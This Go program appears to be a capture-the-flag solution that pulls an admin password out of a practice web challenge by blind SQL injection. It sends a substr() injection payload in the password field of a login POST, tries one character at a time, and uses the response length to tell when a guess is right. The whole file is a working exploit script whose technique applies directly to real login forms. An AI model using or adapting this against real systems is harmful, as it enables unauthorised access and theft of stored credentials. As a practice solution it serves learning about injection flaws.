package main

import (
	"fmt"
	"net/http"
	"net/url"
)

func main() {
	Url := "http://ctfq.sweetduet.info:10080/~q6/"
	tbl := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_"
	p := ""
	for i := 0; i < 30; i++ {
		found := false
		for _, c := range tbl {
			ps := fmt.Sprintf("' or substr((SELECT pass FROM user WHERE id='admin'), %d, 1)='%c", len(p)+1, c)
			param := url.Values{}
			param.Set("id", "admin")
			param.Add("pass", ps)
			resp, err := http.PostForm(Url, param)
			if err != nil {
				fmt.Println(err)
			}
			defer resp.Body.Close()
			if resp.ContentLength >= 600 {
				p += string(c)
				fmt.Println("ok", p)
				found = true
				break
			}
		}
		if !found {
			fmt.Println("end")
			break
		}
	}
}
